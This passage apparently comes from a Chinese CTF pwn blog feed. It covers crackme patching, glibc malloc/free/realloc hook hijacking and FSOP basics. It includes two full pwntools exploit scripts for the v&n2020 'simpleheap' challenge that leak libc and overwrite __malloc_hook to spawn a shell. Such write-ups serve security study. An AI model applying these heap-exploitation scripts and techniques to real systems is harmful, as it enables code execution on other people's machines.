class="line">00447462   . |83C0 70       add eax,0x70</span><br><span class="line">00447465   . |BA 8C744400   mov edx,CKme002.0044748C                 ;  厉害厉害真厉害！佩服佩服真佩服！！</span><br><span class="line">0044746A   . |E8 EDC4FBFF   call CKme002.0040395C</span><br><span class="line">0044746F   . |BA B8744400   mov edx,CKme002.004474B8                 ;  注册了</span><br><span class="line">00447474   . |8B83 EC020000 mov eax,dword ptr ds:[ebx+0x2EC]</span><br><span class="line">0044747A   . |E8 3DCCFDFF   call CKme002.004240BC</span><br><span class="line">0044747F   &gt; \5B            pop ebx                                  ;  kernel32.76FCFA29</span><br><span class="line">00447480   .  C3            retn</span><br></pre></td></tr></table></figure><p>发现所有的跳转都是跳过成功,将所有的跳转nop即可</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-07-24_204852.png" alt=""></p><h2 id="crackme5"><a href="#crackme5" class="headerlink" title="crackme5-"></a>crackme5-</h2><h1 id="任务Ⅳ"><a href="#任务Ⅳ" class="headerlink" title="任务Ⅳ"></a>任务Ⅳ</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在调用malloc或者free的时候，如果 <strong>malloc_hook 和free_hook的值存在</strong>，<strong>则会调用malloc_hook或者free_hook指向的地址</strong>，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(/bin/sh\x00)的chunk，可以达到system(/bin/sh)来getshell</p><ul><li>malloc_hook位于main_arena下方的位置(绝大多时候是0x10)，可以通过fake chunk来overwrite该值实现getshell</li><li>free_hook 位于libc上_free_hook上，可以通过fake chunk来overwrite该值达到劫持程序流的目的</li></ul><h2 id="malloc-hook利用"><a href="#malloc-hook利用" class="headerlink" title="malloc_hook利用"></a>malloc_hook利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li>利用思路：在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在，将调用malloc_hook指向的地址call rax，如果我们将该值overite 为one_gadget，当程序执行malloc的时候，便可以getshell</li></ul><h2 id="free-hook利用"><a href="#free-hook利用" class="headerlink" title="free_hook利用"></a>free_hook利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>利用思路：<ul><li>通过改写main_arena中的top_chunk的地址，将top_chunk的值改写到<strong>free_hook上方指定的位置，通过不断向top_chunk申请chunk，最终可以分配到包含</strong>free_hook的区块，从而可以改写__free_hook的值。</li><li>通过改写global_max_fast的值，可以在free_hook的上方找到一个足够大包含free_hook的块，当改写了global_max_fast后，向heap申请的块都将按照fastbin来处理</li><li>通过unsorted bin attack 在free_hook上方<strong>伪造 0x7f大小的chunk</strong>,再通过fastbin attack 来修改free_hoook的值</li></ul></li></ul><h2 id="realloc-hook与malloc-hook的联合利用"><a href="#realloc-hook与malloc-hook的联合利用" class="headerlink" title="realloc_hook与malloc_hook的联合利用"></a>realloc_hook与malloc_hook的联合利用</h2><p>因为</p><p>realloc_hook与malloc_hook 相似是一个弱类型的指针.在调用realloc()函数是会判断realloc_hook的值是否为空,不为空则执行其执行的代码.这是realloc_hook的一种用法。</p><p>大多时候在执行onegadget时,并不容易满足限制条件,故而可以利用realloc()来调整栈帧以满足条件</p><p>即可以用malloc_hook来指向_libc_realloc()函数内部(即强行调用realloc())然后通过realloc_hook来触发one_gadget.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000009</span>AE84 <span class="number">41</span> <span class="number">57</span>                         push    r15</span><br><span class="line">.text:<span class="number">000000000009</span>AE86 <span class="number">41</span> <span class="number">56</span>                         push    r14</span><br><span class="line">.text:<span class="number">000000000009</span>AE88 <span class="number">41</span> <span class="number">55</span>                         push    r13</span><br><span class="line">.text:<span class="number">000000000009</span>AE8A <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">000000000009</span>AE8C <span class="number">49</span> <span class="number">89</span> F4                      mov     r12, rsi</span><br><span class="line">.text:<span class="number">000000000009</span>AE8F <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">000000000009</span>AE90 <span class="number">48</span> <span class="number">89</span> FD                      mov     rbp, rdi</span><br><span class="line">.text:<span class="number">000000000009</span>AE93 <span class="number">53</span>                            push    rbx</span><br><span class="line">.text:<span class="number">000000000009</span>AE94 <span class="number">48</span> <span class="number">83</span> EC <span class="number">18</span>                   sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">000000000009</span>AE98 <span class="number">48</span> <span class="number">8B</span> <span class="number">05</span> <span class="number">41</span> <span class="number">11</span> <span class="number">15</span> <span class="number">00</span>          mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">000000000009</span>AE9F <span class="number">48</span> <span class="number">8B</span> <span class="number">00</span>                      mov     rax, [rax]</span><br><span class="line">.text:<span class="number">000000000009</span>AEA2 <span class="number">48</span> <span class="number">85</span> C0                      test    rax, rax</span><br><span class="line">.text:<span class="number">000000000009</span>AEA5 <span class="number">0F</span> <span class="number">85</span> <span class="number">35</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_9B0E0</span><br></pre></td></tr></table></figure><p><code>malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget</code></p><p>我们可以将realloc_hook改为onegadget，然后通过这些push和sub操作”微调”rsp寄存器，使其能够满足在调用realloc_hook（也就是onegadget）的时候满足相应的rsp条件。相应的利用方法就是由传统的直接修改malloc_hook变为先修改realloc_hook为onegadget之后，修改malloc_hook到特定的一个push处或sub处，然后调用malloc便相当于执行了满足条件的onegadget。</p><p><strong>此外符号__malloc_hook与__realloc_hook在数据段中是相邻的,realloc在前</strong></p><p><strong>__free_hook的位置与前二者不相邻</strong></p><p>参数也有差异,_malloc_hook与__realloc_hook的参数为申请的chunk的大小</p><p>__free_hook的参数则为释放的chunk的地址</p><h2 id="v-amp-n2020招新赛simpleheap"><a href="#v-amp-n2020招新赛simpleheap" class="headerlink" title="v&amp;n2020招新赛simpleheap"></a>v&amp;n2020招新赛simpleheap</h2><p>核心利用是off-by-one以及unsortedbin attack</p><p>程序的漏洞在于其edit函数存在off-by-one，以此来修改下一个chunk的size域</p><p>并利用unsortedbin的切割特性来泄露mainarena+88,来得到libc_base</p><p>再通过伪造一个fakechunk(可写hook)到fastbins链上,使得两次分配得到该chunk并覆写mallochook和reallochook</p><p>不直接覆盖mallochook为onegadget的原因是,四个onegadget的条件都不满足,故只能通过realloc函数来调整栈帧并调用reallochook为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./vn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">gdb.attach(p) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"> </span><br><span class="line">one = <span class="number">0x4527a</span></span><br><span class="line">onegadget = libc_base + one</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">b&#x27;\n&#x27;</span><span class="comment">#这两个换行很重要,没有换行就会卡住不知道为什么</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">-----------------------又或者另一个有微小差异的版本--------------------------------------</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./vn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3 阻断top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">libc_base=leak-(<span class="number">0x3c4b78</span>)</span><br><span class="line"></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment"># 4与2同时指向0x70</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk_addr)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#换行依然很重要</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#5</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行有小几率会发生段错误</p>]]></content>
    
    
    <summary type="html">week-2</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="SunmerCamp2023" scheme="https://ixout.github.io/tags/SunmerCamp2023/"/>
    
  </entry>
  
  <entry>
    <title>初探FSOP</title>
    <link href="https://ixout.github.io/posts/6507/"/>
    <id>https://ixout.github.io/posts/6507/</id>
    <published>2023-07-21T05:06:13.000Z</published>
    <updated>2023-07-30T11:42:59.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h1><p>FSOP 是 File Stream Oriented Programming 的缩写。所有的 _IO_FILE 结构会由 _chain 字段连接形成一个链表，<strong>由全局变量 _IO_list_all 来维护表头</strong>。而 FSOP 的核心思想就是劫持通过 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项。</p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>先看FSOP技术利用的核心函数<strong>_IO_flush_all_lockp</strong></p><p>该函数会刷新_IO_list_all 链表中所有项的文件流，<strong><u>相当于对每个 FILE 调用 fflush(更新缓存区函数)</u></strong>，也对应着会调用vtable 中的_IO_overflow(以当前io_file指针为参数)。</p><p>关键部分如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可见要执行_IO_OVERFLOW的前提是:</p><ol><li><strong>fp-&gt;_mode&lt;=0</strong></li><li><strong>fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</strong></li></ol><p>或者:</p><ol><li><strong>fp-&gt;_mode &gt; 0</strong></li><li><strong>_IO_vtable_offset (fp) == 0</strong></li><li><strong>fp-&gt;_wide_data-&gt;_IO_write_ptr&gt;fp-&gt;_wide_data-&gt;_IO_write_bas</strong></li></ol><p>其中<code># define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</code>就是获得_IO_FILE结构体中的_vtable_offset</p><p><strong>这二者都是可行的,不过个人比较喜欢用前者更方便</strong></p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>那么该如何调用<strong>_IO_flush_all_lockp</strong></p><p>_IO_flush_all_lockp 在以下三种情况下会被系统调用：</p><ol><li><strong>当执行 abort 流程时</strong></li><li><strong>当执行 exit 函数时</strong></li><li><strong>当执行流从 main 函数返回时</strong></li></ol><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>在堆中,触发错误时的malloc_printer函数会调用abort</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/abort_routine.001.jpeg" alt=""></p><h1 id="2-23利用"><a href="#2-23利用" class="headerlink" title="2.23利用"></a>2.23利用</h1><p>从以上可知只要分别伪造_IO_FILE和vtable,部署好函数调用</p><p>例如除绕过检测之外</p><ol><li>在IO_FILE开头写上b’/bin/sh\0’</li><li>IO_OVERFLOW写为system</li></ol><p>就能getshell</p><p><strong>IO_FILE</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. 